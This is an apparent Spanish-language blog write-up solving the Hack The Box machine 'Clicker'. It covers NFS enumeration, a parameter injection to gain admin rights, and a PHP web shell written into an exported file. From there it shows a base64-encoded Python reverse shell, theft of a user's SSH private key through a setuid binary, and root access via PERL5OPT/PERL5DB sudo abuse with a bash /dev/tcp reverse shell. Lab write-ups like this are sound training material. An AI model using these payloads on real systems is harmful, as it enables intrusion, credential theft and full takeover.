---
title: Clicker - Hack the Box (htb)
date: 2023-12-06 14:09:00 +0800
categories: [writeup, htb]
tags: [htb,ctf,linux,hack the box,CRLF,CVE-2016-1531,PERL,sudo,env]
math: true
mermaid: true
image:
  path: /writeup-htb-clicker/htb.png
  alt: Clicker
---

> Es un placer darles la bienvenida a un emocionante viaje por el mundo de HackTheBox. En esta ocasión, nos sumergiremos en los entresijos de la máquina Clicker, un desafío catalogado como de dificultad media y alojado en un servidor Linux. A lo largo de este fascinante recorrido, explotaremos la vulnerabilidad de inyección de CRLF (Carriage Return Line Feed) y conseguiremos el archivo id_rsa de un usuario para obtener el flag del usuario. Como desafío final, debemos realizar una escalada de privilegios (privilege escalation), la cual se llevará a cabo aprovechando los permisos sudo y explotando la vulnerabilidad CVE-2016-1531.  	

## Reconocimiento
Primeramente iniciamos con el escaneo de puertos mediante la herramienta `nmap`.
> Nmap es una herramienta de código abierto utilizada para explorar y mapear redes, así como para descubrir dispositivos y servicios en una red.  
{: .prompt-info }
```bash
sudo nmap 10.10.11.232 -Pn -p- -n -sS -T4 -oN scan1 --open -vvv
```
Como resultado se obtienen 9 puertos abiertos.  
![Desktop View](/writeup-htb-clicker/nmap1.png)
_Nmap_

Para obtener mayor información de estos puertos se utilizará el siguiente comando:  
```bash
nmap 10.10.11.232 -Pn -p 22,80,111,2049,34187,34685,45985,57739,57779 -sV -sC -oN scan2
```
El resultado arroja bastante información, donde los puntos más relevantes son: en el puerto `22` se ejecuta el servicio de `ssh`, en el puerto `80` hay una página web la cual nos redirige a `clicker.htb` y en el puerto `111` está habilitado `rpcbind`, el cual es un servicio que asigna un número de puerto a servicios `RPC` (Remote Procedure Call).  
![Desktop View](/writeup-htb-clicker/nmap2.png)
_Nmap_

## Enumeración
Teniendo la información de los puertos procedemos a realizar la enumeración.  
Primeramente en el puerto `80` existe una página web que nos redirige a `https://clicker.htb`, por lo tanto, para poder visualizarla se debe agregar al archivo `/etc/hosts`{: .filepath}.  
Editamos el archivo con `nano` y agregamos una nueva línea con la siguiente información.
```
10.10.11.232    clicker.htb
```
{: file='/etc/hosts'}
>Primero la ip y luego el dominio.
{: .prompt-info }
Ahora podemos ver el contenido de `https://clicker.htb`, donde es una página web de un juego.  
![Desktop View](/writeup-htb-clicker/web.png)
_https://clicker.htb_

Realizamos la enumeración de los directorios y archivos utilizando la herramienta `gobuster`.  
> Gobuster es una herramienta diseñada para la enumeración de directorios y archivos en sitios web. Su función principal es realizar ataques de fuerza bruta contra un servidor web para descubrir nombres de directorios y archivos que podrían no ser fácilmente accesibles.  
{: .prompt-info }

```bash
gobuster dir -u http://clicker.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 403,404 -x .php,.xml,.html -r -t 100
```
Como resultado se obtienen los archivos `index.php`, `login.php`, `register.php`, `info.php`, `profile.php`, `admin.php`, `logout.php`, `export.php`, `play.php`, `authenticate.php` y `diagnostic.php`.  
![Desktop View](/writeup-htb-clicker/gobuster.png)
_gobuster_

Con esto hemos terminado de enumerar la parte web.  
### Servicio NFS
Ahora en el puerto `111` donde está habilitado `rpcbind`, según la información obtenida de nmap se ha asignado el puerto `2049` al servicio `NFS`.
> NFS, o "Network File System" (Sistema de Archivos en Red), es un protocolo que permite a un sistema acceder y compartir archivos con otros sistemas a través de una red. NFS es comúnmente utilizado en entornos de red de área local (LAN) y facilita el acceso a archivos en sistemas remotos de manera transparente, como si estuvieran almacenados localmente.
{: .prompt-info }
> Como este servicio permite compartir archivos, quizás aquí haya información relevante.
{: .prompt-tip }
Seguimos los pasos del artículo [**How to Mount an NFS Share in Linux**](https://linuxize.com/post/how-to-mount-an-nfs-share-in-linux/#manually-mounting-an-nfs-file-systems) para montar el servicio NFS y así obtener los archivos compartidos.
- Primero debemos crear una carpeta donde se va a alojar estos archivos.  
```bash
sudo mkdir /nfs 
```

> Donde nfs es el nombre de la carpeta a crear.  
{: .prompt-info }

- Luego usamos `mount` para montar un sistema de archivos.  
```bash
sudo mount -t nfs 10.10.11.232:/ nfs 
```

> Donde:  
	**-t nfs** indica que el sistema de archivos va a hacer nfs.  
	**10.10.11.232:/** es la dirección ip del servidor seguido de : luego /, donde este último indica el directorio a montar, como quiero montar todos los directorios coloco /.  
	**nfs** es la carpeta que acabo de crear en el paso anterior.
{: .prompt-info }
Una vez montado listamos los archivos de la carpeta `nfs`.  
```bash
ls -laR
```
Observamos que dentro de `mnt/backups` hay un archivo `clicker.htb_backup.zip`.  
![Desktop View](/writeup-htb-clicker/mnt.png)
_Listar archivos_
Como el directorio montado está vinculado con el directorio original del servidor, no se puede hacer cambios, por lo tanto, vamos a copiar el archivo `clicker.htb_backup.zip` a otro directorio.  
```bash
cp clicker.htb_backup.zip ~/htb/clicker/DatosObtenidos
```
Ahora con `unzip` obtenemos los archivos que se encuentran comprimidos.  
```bash
unzip clicker.htb_backup.zip
```
![Desktop View](/writeup-htb-clicker/unzip.png)
_unzip_

Estos archivos son del código fuente de la página web que se encuentra en puerto `80`.  
![Desktop View](/writeup-htb-clicker/backup.png)
_archivos backup_

## Explotación
Con los archivos encontrados procedemos a revisar su funcionamiento.  
### Búsqueda de vulnerabilidades web
Primeramente vamos a registrar una cuenta, para ello vamos a `register.php` y colocamos un `usuario` y un `password`. En este caso coloqué `prueba` como usuario y contraseña.
![Desktop View](/writeup-htb-clicker/register.png)
_register_
La cuenta fue creada correctamente.  
![Desktop View](/writeup-htb-clicker/register successful.png)
_register successful_
Ahora nos logueamos con las credenciales registradas, para ello nos dirigimos a `login.php`.  
![Desktop View](/writeup-htb-clicker/login.png)
_login_
Una vez logueados nos aparece en el menú la opción `play`.  
![Desktop View](/writeup-htb-clicker/home.png)
_home_
Hacemos click en play, aparece un juego que consiste en dar clicks y para subir de nivel se debe tener una cierta cantidad de clicks, también hay la opción de guardar y cerrar.  
![Desktop View](/writeup-htb-clicker/play.png)
_play_
Vamos a utilizar la funcionalidad proxy de `Burp Suite` para ver que procedimiento realiza cuando hacemos click en `save and close`.
> Burp Suite es una suite de herramientas utilizada principalmente para realizar pruebas de seguridad en aplicaciones web. Algunas de las características clave de Burp Suite incluyen: Proxy Intercept, Spider, Scanner, Repeater, Sequencer, Decoder, Comparer, Intruder ,etc.  
{: .prompt-info }
Hacemos click en `save and close`; en el proxy de burp suite aparece una petición `GET` que envia los parámetros `clicks` y `level` a la página `save_game.php`.  
![Desktop View](/writeup-htb-clicker/burpsuite.png)
_Burpsuite_
Revisando el código fuente de `save_game.php` encontramos que los parámetros y valores enviados por `GET` son enviados a la función `save_profile` sin ninguna restricción respecto a la cantidad de parámetros, sin embargo, no se puede enviar como parámetro `role`.  
![Desktop View](/writeup-htb-clicker/save_game.png)
_save_game.php_
También encontramos que se incluye a `db_utils.php` como código, por lo tanto, acá debe de estar la función `save_profile`.  
En el código fuente de `db_utils.php` hay muchas funciones que interactúan con la base de datos. 
La función `save_profile` realiza un update a la tabla `players`, por lo tanto, si enviamos cualquier columna de la tabla como parámetro se actualizará su valor.  
![Desktop View](/writeup-htb-clicker/save_profile.png)
_save_profile_
Dentro de este mismo archivo se encuentra la función `create_new_player`, donde indica que las columnas de la tabla `save_profile` son: `username`, `nickname`, `password`, `role`, `clicks` y `level`. Por defecto cuando un usuario se registra le dan el rol de `User`.  
![Desktop View](/writeup-htb-clicker/create_new_player.png)
_create_new_player_
Como hay un rol de usuario, también debe haber un rol de administrador; en el código fuente de `admin.php` se encontró que el rol de administrador es `Admin`.  
![Desktop View](/writeup-htb-clicker/admin.png)
_admin.php_
> Habiendo obtenido toda esta información podemos concluir que para poder convertirnos en Administrador debemos cambiar nuestro rol a `Admin` y esto lo realizaremos mediante la petición GET que envía parámetros y datos a la página `save_game.php`. Sin embargo hay un inconveniente, existe una validación que impide el paso del parámetro `role`, debemos de bypasear está validación.
{: .prompt-tip }
### Vulnerabilidad CRLF
Buscando en google encontré que como las entradas no están sanetizadas, podría ser vulnerable a la inyección de CRLF.
> La vulnerabilidad de inyección de CRLF (Carriage Return Line Feed) se produce cuando un atacante logra insertar caracteres de retorno de carro (\r) y avance de línea (\n) en datos que son procesados por una aplicación. Esta vulnerabilidad es particularmente significativa en el contexto web, donde los caracteres CRLF se utilizan para representar el final de una línea de texto en los encabezados HTTP.
{: .prompt-info }
En el artículo [**CRLF (%0D%0A) Injection**](https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a) explican a detalle la vulnerabilidad e indican que se debe colocar `%0D%0A` para realizar el retorno de carro y avance de línea.  
Sabiendo todo esto vamos a realizar el ataque con los siguientes pasos.
- Primero vamos a enviar al repetidor (función repeter de burp suite) la captura proxy de la petición GET de `save_game.php`.  
![Desktop View](/writeup-htb-clicker/repetidor.png)
_repetidor_
- Agregamos en el request lo siguiente:  
```
&role%0D%0A=Admin
```
![Desktop View](/writeup-htb-clicker/crlf.png)
_crlf_
- Enviamos la petición y obtenemos como resultado el mensaje de `Game has been saved!`, por lo tanto, la inyección ha sido todo un éxito y ahora nuestro rol es de administrador.  
![Desktop View](/writeup-htb-clicker/crlf2.png)
_Response_

Para corroborar todo esto vamos a desloguearse de la página web y luego volvemos a loguearse.  
Ahora en el home aparece la opción `Administration`, por lo tanto, somos administradores.  
![Desktop View](/writeup-htb-clicker/home2.png)
_Home_
Hacemos click en Administration, nos lleva a un portal que muestra el top de jugadores y nos da la opción de exportar estos datos en formato txt, json y html.  
![Desktop View](/writeup-htb-clicker/administration.png)
_Administration_
Exportamos los datos en formato html y obtenemos como resultado un mensaje: los datos han sido guardados en la ruta `exports/top_players_uyclieqo.html`.
![Desktop View](/writeup-htb-clicker/export.png)
_export_
Colocamos en el navegador la ruta `http://clicker.htb/exports/top_players_uyclieqo.html` y se pueden ver los datos.
Donde además de ver el top de jugadores también aparece los datos de nuestro usuario.
![Desktop View](/writeup-htb-clicker/show export.png)
_show export_
En el proxy de burp suite observamos que cuando dimos click en export se disparó una petición `POST` enviando como parámetros `threshold` y `extension` con destino a `export.php`.
![Desktop View](/writeup-htb-clicker/burpsuite2.png)
_Burpsuite_
Vamos a colocar como extensión `php`, para ver si nos genera un export con dicha extensión.  
Enviamos al repetidor la petición y cambiamos la extensión a php, luego enviamos la petición.  
Obtenemos como resultado una exportación exitosa e indica que la ruta donde se guardó la exportación es `exports/top_players_os95bcqz.php`.  
![Desktop View](/writeup-htb-clicker/change extension.png)
_change extension_
Colocamos en el navegador lo siguiente `http://clicker.htb/exports/top_players_os95bcqz.php`, observamos que aparecen los datos, por lo tanto, si podemos generar un archivo `.php` como exportación.  
![Desktop View](/writeup-htb-clicker/show export2.png)
_show export_

> Como en el archivo `.php` exportado se guardan los datos de nuestro usuario y del top de players, donde las columnas exportadas son: `nickname`, `clicks` y `level`. Para poder conseguir una `shell`, podemos colocar código php en el nickname de nuestro usuario y de esa manera cuando ingresemos al archivo `.php` exportado, vamos a lograr ejecutar comandos. Para cambiar el `nickname` utilizaremos la petición GET de `save_game`.
{: .prompt-tip }
### Ingreso al sistema
- Agregamos en la petición GET de `save_game` lo siguiente:  
```
&nickname=<%3fphp+system($_GET["cmd"])%3b%3f>
```

> La shell está encodeada en formato url para que se acepte la petición. El código php de la shell sin encodear es: `<?php system($_GET["cmd"]);?>`.
{: .prompt-info }
Luego lo enviamos y el nickname se cambia de manera exitosa.
![Desktop View](/writeup-htb-clicker/change nickname.png)
_change nickname_
- Procedemos a exportar los datos en formato php e indica que la exportación ha sido un éxito. 
![Desktop View](/writeup-htb-clicker/change extension2.png)
_change extension_
- Colocamos en la url la ruta proporcionada de la exportación y agregamos `?cmd=id` para ejecutar el comando id.
Obtenemos como resultado `www-data`, por lo tanto, la shell está funcionando bien.  
![Desktop View](/writeup-htb-clicker/show export3.png)
_show export_
- Ahora bien para poder ejecutar comandos desde nuestra terminal, vamos a colocar nuestro puerto 3222 en escucha.
```bash
nc -lvnp 3222
```
En el navegador vamos a colocar el siguiente valor en el parámetro `cmd`.  
```
echo "cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjEwIiwzMjIyKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigiL2Jpbi9iYXNoIikn" | base64 -d | bash
```

> Donde el valor del echo es: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.10",3222));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'` solo que está encodeado en base64.
{: .prompt-info }
Ejecutamos.  
![Desktop View](/writeup-htb-clicker/shell.png)
_Obtención shell_
Luego de unos segundos ya tenemos nuestra shell en nuestra terminal.  
![Desktop View](/writeup-htb-clicker/shell2.png)
_Shell_
Ahora nos dirigimos a la carpeta home, donde hay una carpeta del usuario jack, sin embargo, no tenemos permisos para ingresar.  
![Desktop View](/writeup-htb-clicker/home3.png)
_home_
### Obtención del flag del usuario
Para obtener acceso a ese usuario realicé una busqueda de los archivos del usuario `jack` a los cuales tengo permiso de ejecución.  
```bash
find / -user jack -perm -o+x 2>/dev/null
```
Encontré que tengo acceso a la carpeta `/opt/manage`.  
![Desktop View](/writeup-htb-clicker/find.png)
_find_
Nos vamos a la carpeta y listamos el contenido.  
```bash
ls -la
```
En la carpeta hay 2 archivos a los cuales tengo permiso, uno de lectura y otra de ejecución. El archivo de ejecución tiene permisos `s`, por lo tanto, todo lo que ejecute se realizará como si fuera el usuario original, es decir como jack.  
![Desktop View](/writeup-htb-clicker/ls.png)
_ls_
En el contenido del archivo `README.txt` indican que el binario puede realizar 4 tareas.  
![Desktop View](/writeup-htb-clicker/readme.png)
_readme_
Ejecutamos el binario con la opción 2 para ver su funcionamiento.  
```bash
./execute_query 2
```
Vemos que se creó usuarios al azar.  
![Desktop View](/writeup-htb-clicker/execute_query.png)
_execute_query_
Hay que buscar vulnerabilidades en este binario, para ello vamos a utilizar el comando `strace`.
> El comando strace en Unix se utiliza para realizar un seguimiento (trace) del sistema de llamadas realizadas por un programa. Permite interceptar y registrar las llamadas al sistema y las señales que realiza un programa durante su ejecución. Esto puede ser útil para depurar problemas, entender el comportamiento de un programa, o diagnosticar problemas de rendimiento.
{: .prompt-info }
Ejecutamos el strace.  
```bash
strace ./execute_query 2
```
Observamos que justo al finalizar se intenta acceder a la ruta `/home/jack/queries/populate.sql`, entonces este binario intenta acceder a algunos archivos de jack.    
![Desktop View](/writeup-htb-clicker/strace.png)
_strace_
En este punto me pregunté ¿ Qué sucede sin en vez de colocar como parámetro los números que me indican colocó otro valor?.  
Primero probé colocando una letra y dio el mensaje de `ERROR: Invalid arguments`, sin embargo, al colocar un número diferente al de las opciones recibí como mensaje `Segmentation fault (core dumped)`.
![Desktop View](/writeup-htb-clicker/execute_query2.png)
_execute_query_
Ahora ejecuté con strace esta opción.
```bash
strace ./execute_query 6
```
Observó que el mensaje de error sale justo antes de que el binario intente acceder a una ruta y además se observa un `si_addr` como nulo, esto hace pensar que el programa está esperando una ruta.
![Desktop View](/writeup-htb-clicker/strace2.png)
_strace_
Colocamos después del número una ruta.
```bash
./execute_query 6 ../hola
```
Sale como mensaje `File not readable or not found`, por lo tanto, si estaba esperando una ruta.  
![Desktop View](/writeup-htb-clicker/execute_query3.png)
_execute_query_
Ejecutamos con strace nuevamente el comando.  
```bash
strace ./execute_query 6 ../hola
```
Observamos que antes de la ruta proporcionada aparece `/home/jack/queries/`.  
![Desktop View](/writeup-htb-clicker/strace3.png)
_strace_
Por lo tanto, hay que proporcionar al binario una ruta de un archivo que si existe, para ver que acciones realiza.  
> Como el puerto `22` del servicio `ssh` está activo, quizás este usuario tiene el archivo `id_rsa` en su directorio; este archivo siempre se aloja dentro de la carpeta `.ssh`.
{: .prompt-info }
Ejecutamos el programa.
```bash
./execute_query 6 ../.ssh/id_rsa
```
Observamos que nos trae todo el contenido del archivo `id_rsa`.  
![Desktop View](/writeup-htb-clicker/execute_query4.png)
_execute_query_
Con el contenido del archivo `id_rsa` podemos loguearse mediante ssh con el usuario jack.
Para ello realizamos los siguientes pasos.
- Primero copiamos el contenido del `id_rsa` y luego creamos mediante nano un archivo id_rsa en nuestra máquina (máquina del atacante).
```bash
nano id_rsa
```
- Pegamos el contenido del `id_rsa` en el archivo, luego borramos el encabezado y colocamos.
```
-----BEGIN OPENSSH PRIVATE KEY-----
```
- Borramos el pie de la página y colocamos.
```
-----END OPENSSH PRIVATE KEY-----
```
- Ahora guardamos el archivo y le damos permisos de solo lectura mediante el siguiente comando.
```bash
chmod 400 id_rsa
```
- Nos conectamos al usuario jack mediante ssh.  
```bash
ssh -i id_rsa jack@10.10.11.232
```
![Desktop View](/writeup-htb-clicker/shell3.png)
_Shell_

Obtenemos el flag del usuario.  
![Desktop View](/writeup-htb-clicker/user flag.png)
_user flag_
## Escalada de privilegios (Privilege escalation)
Como desafío final debemos escalar privilegios para obtener el acceso a root. Realizamos la enumeración del sistema y en los permisos sudo encontramos que podemos ejecutar un archivo como root.  
Para ver los permisos sudo, digitamos el siguiente comando.  
```bash
sudo -l
```
![Desktop View](/writeup-htb-clicker/sudo -l.png)
_sudo -l_

El archivo que podemos ejecutar como sudo es `/opt/monitor.sh`.  
Listamos los permisos del archivo.
```bash
ls -la /opt/monitor.sh
```
Observamos que nuestro usuario actual tiene permisos de ejecución.  
![Desktop View](/writeup-htb-clicker/ls2.png)
_Listar permisos_
Visualizamos su contenido.
```bash
cat /opt/monitor.sh
```
Los puntos a resaltar son que se recuperan datos desde la URL `http://clicker.htb/diagnostic.php?token=secret_diagnostic_token` y luego estos datos se formatean con el programa `xml_pp`.
![Desktop View](/writeup-htb-clicker/cat.png)
_visualizar código_

Revisamos el código fuente de `diagnostic.php`. PD: Este código está dentro del backup que se obtuvo en la parte de enumeración.    
El punto más importante es que se extrae las `variables de entorno` y se coloca dentro de la etiqueta `environment`.
![Desktop View](/writeup-htb-clicker/diagnostic.png)
_diagnostic.php_
Ahora visualicemos el código de `xml_pp`.
```bash
cat /usr/bin/xml_pp
```
Este programa está escrito en `PERL`.
![Desktop View](/writeup-htb-clicker/xml_pp.png)
_xml_pp_
> Este programa debe tener una vulnerabilidad referente a `PERL` y a las `variables de entorno`.
{: .prompt-tip }
Buscamos en google y encontramos el siguiente artículo [**HACKING WITH ENVIRONMENT VARIABLES**](https://www.elttam.com/blog/env/).
> Donde indica que la vulnerabilidad `CVE-2016-1531` permite ejecutar comandos en `PERL` por medio de `variables de entorno`. 
{: .prompt-info }
Para explotar la vulnerabilidad debemos hacer lo siguiente.
- Colocar la variable de entorno `PERL5OPT` con el valor `-d` y la variable `PERL5DB` con el valor de `system('id')`; donde en el interior de system va el comando a ejecutar.
- Declaramos las variables y ejecutamos el programa.
```bash
sudo PERL5OPT=-d PERL5DB="system('id')" /opt/monitor.sh
```
El comando id se ejecutó con éxito, por lo tanto, este programa si era vulnerable al `CVE-2016-1531`.
![Desktop View](/writeup-htb-clicker/monitor.png)
_Ejecución monitor_

Ahora podemos ejecutar un comando para obtener una shell de root.    
Para ello colocamos puerto 1234 en escucha.  
```bash
nc -lvnp 1234
```
Ejecutamos el siguiente comando en la máquina víctima.  
```bash
sudo PERL5OPT=-d PERL5DB="system('bash -c \"/bin/bash -i >& /dev/tcp/10.10.14.10/1234 0>&1\"')" /opt/monitor.sh
```
> Donde: bash -c "/bin/bash -i >& /dev/tcp/10.10.14.10/1234 0>&1" permite obtener una shell.  
{: .prompt-info }
![Desktop View](/writeup-htb-clicker/monitor2.png)
_Ejecución monitor_
Luego de unos segundos ya tenemos nuestra shell con el usuario root.  
![Desktop View](/writeup-htb-clicker/root shell.png)
_root shell_
 Nos dirigimos a la carpeta de root donde está nuestro flag `root.txt`.  
![Desktop View](/writeup-htb-clicker/root flag.png)
_Flag del root_
> Espero les haya gustado este post, nos vemos en una siguiente oportunidad.  
`¡Happy Hacking!` `¡You can be root!`


